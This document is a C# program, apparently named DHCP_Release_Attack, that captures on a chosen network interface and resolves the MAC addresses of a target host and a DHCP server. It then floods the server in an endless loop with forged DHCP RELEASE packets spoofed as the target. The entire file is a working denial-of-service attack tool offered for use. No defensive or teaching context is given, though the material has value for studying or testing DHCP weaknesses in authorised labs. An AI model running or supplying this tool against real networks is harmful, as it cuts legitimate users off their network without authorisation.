using DhcpDotNet;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using SharpPcap.Npcap;
using System;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;

namespace DHCP_Release_Attack
{
    class Program
    {
        private static Interface localInterface = new Interface();
        private static ICaptureDevice device;

        static void Main(string[] args)
        {
            // Retrieve the device list
            var devices = CaptureDeviceList.Instance;

            // If no devices were found print an error
            if (devices.Count < 1)
            {
                Console.WriteLine("No devices were found on this machine");
                return;
            }

            int i = 0;

            // Print out the devices
            foreach (var dev in devices)
            {
                /* Description */
                Console.WriteLine("{0}) {1}", i, dev.Description);
                i++;
            }

            Console.WriteLine();
            Console.Write("-- Please choose a device to capture: ");
            i = int.Parse(Console.ReadLine());

            device = devices[i];

            // Open the device for capturing
            int readTimeoutMilliseconds = 1000;
            if (device is NpcapDevice)
            {
                var nPcap = device as NpcapDevice;
                nPcap.Open(SharpPcap.Npcap.OpenFlags.DataTransferUdp | SharpPcap.Npcap.OpenFlags.NoCaptureLocal, readTimeoutMilliseconds);
            }
            else if (device is LibPcapLiveDevice)
            {
                var livePcapDevice = device as LibPcapLiveDevice;
                livePcapDevice.Open(DeviceMode.Promiscuous, readTimeoutMilliseconds);
            }
            else
            {
                throw new InvalidOperationException("unknown device type of " + device.GetType().ToString());
            }

            //--User Input Settings
            Console.Write("Target IP-Address: ");
            IPAddress targetIpAddress = IPAddress.Parse(Console.ReadLine());

            Console.Write("DHCP-Server IP-Adress: ");
            IPAddress dhcpServIpAddress = IPAddress.Parse(Console.ReadLine());

            Console.Write("Sending delay (in ms): ");
            string sendingDelay = Console.ReadLine();


            //--GET Hw-Address from Target and DHCP-Server
            Console.WriteLine("Getting Hw-Addresses from Hosts...");

            PhysicalAddress targetHwAddress = PhysicalAddress.Parse(localInterface.sendArpRequest(targetIpAddress));
            PhysicalAddress dhcpServHwAddress = PhysicalAddress.Parse(localInterface.sendArpRequest(dhcpServIpAddress));

            //--Print Out Hw-Addresses
            Console.WriteLine("Target Hw-Address: " + targetHwAddress);
            Console.WriteLine("DHCP-Server Hw-Address: " + dhcpServHwAddress);

            Console.WriteLine("Press ENTER to start...");
            Console.Read();

            while (true)
            {
                sendDhcpRelease(targetHwAddress, targetIpAddress, dhcpServHwAddress, dhcpServIpAddress);
                Thread.Sleep(Convert.ToInt32(sendingDelay));
            }
        }

        private static void sendDhcpRelease(PhysicalAddress pSourceHwAddress, IPAddress pSourceIpAddress, PhysicalAddress pDestinationHwAddress, IPAddress pDestinationIpAddress)
        {
            PhysicalAddress ethernetSourceHwAddress = pSourceHwAddress;
            PhysicalAddress ethernetDestinationHwAddress = pDestinationHwAddress;

            var ethernetPacket = new EthernetPacket(ethernetSourceHwAddress,
                                                    ethernetDestinationHwAddress,
                                                    EthernetType.None);


            var ipPacket = new IPv4Packet(pSourceIpAddress, pDestinationIpAddress);

            const ushort udpSourcePort = 68;
            const ushort udpDestinationPort = 67;
            var udpPacket = new UdpPacket(udpSourcePort, udpDestinationPort);

            //-- Combine all bytes to single payload
            byte[] payload = buildDhcpReleasePacket(pSourceIpAddress, pSourceHwAddress, pDestinationIpAddress);

            udpPacket.PayloadData = payload;
            ipPacket.PayloadPacket = udpPacket;
            ethernetPacket.PayloadPacket = ipPacket;

            device.SendPacket(ethernetPacket);
            Console.WriteLine("DHCP Release successful send to: " + pDestinationIpAddress + " from: " + pDestinationIpAddress + " at: " + DateTime.Now.ToShortTimeString());
        }

        private static byte[] buildDhcpReleasePacket(IPAddress pClientIpAddress, PhysicalAddress pClientHwAddress, IPAddress pDestinationIpAddress)
        {
            Random rand = new Random();
            byte[] _transactionID = new byte[4];
            rand.NextBytes(_transactionID);

            DhcpOption dhcpMessageTypeOption = new DhcpOption()
            {
                optionId = dhcpOptionIds.DhcpMessageType,
                optionLength = new byte[] { 0x01 },
                optionValue = new byte[] { 0x07 },
            };

            DhcpOption dhcpServerIdOption = new DhcpOption()
            {
                optionId = dhcpOptionIds.ServerIdentifier,
                optionLength = new byte[] { 0x04 },
                optionValue = pDestinationIpAddress.GetAddressBytes(),
            };

            DhcpOption clientIdOption = new DhcpOption()
            {
                optionId = dhcpOptionIds.ClientIdentifier,
                optionLength = new byte[] { 0x04 },
                optionValue = pClientIpAddress.GetAddressBytes(),
            };

            byte[] options = dhcpMessageTypeOption.buildDhcpOption().Concat(dhcpServerIdOption.buildDhcpOption()).Concat(clientIdOption.buildDhcpOption()).ToArray();

            DhcpPacket dhcpReleasePacket = new DhcpPacket()
            {
                transactionID = _transactionID,
                clientIP = pClientIpAddress.GetAddressBytes(),
                clientMac = pClientHwAddress.GetAddressBytes(),

                dhcpOptions = options,
            };

            return dhcpReleasePacket.buildPacket();
        }
    }
}
